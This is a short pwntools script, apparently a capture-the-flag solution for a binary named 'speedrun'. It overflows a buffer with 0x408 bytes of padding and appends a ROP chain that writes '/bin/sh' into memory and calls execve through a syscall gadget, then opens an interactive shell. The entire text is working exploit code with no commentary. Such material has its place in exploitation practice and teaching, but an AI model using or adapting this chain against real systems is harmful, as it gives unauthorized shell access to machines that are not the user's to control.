from pwn import *
target = process("./speedrun")

rax = p64(0x0000000000415664)
rdi = p64(0x0000000000400686)
rsi = p64(0x00000000004101f3)
rsi = p64(0x00000000004101f3)
rdx = p64(0x00000000004498b5)
mov = p64(0x000000000048d251)
hexBin = p64(0x0068732f6e69622f)
add = p64(0x00000000006b6000)
syscall = p64(0x000000000040129c)

ROP = rax + add
ROP += rdx + hexBin
ROP += mov

ROP += rax + p64(0x3b) 
ROP += rdi + add
ROP += rsi + p64(0x0)
ROP += rdx + p64(0x0)

ROP += syscall

payload = b"0"*0x408 + ROP

target.sendline(payload)
target.interactive()


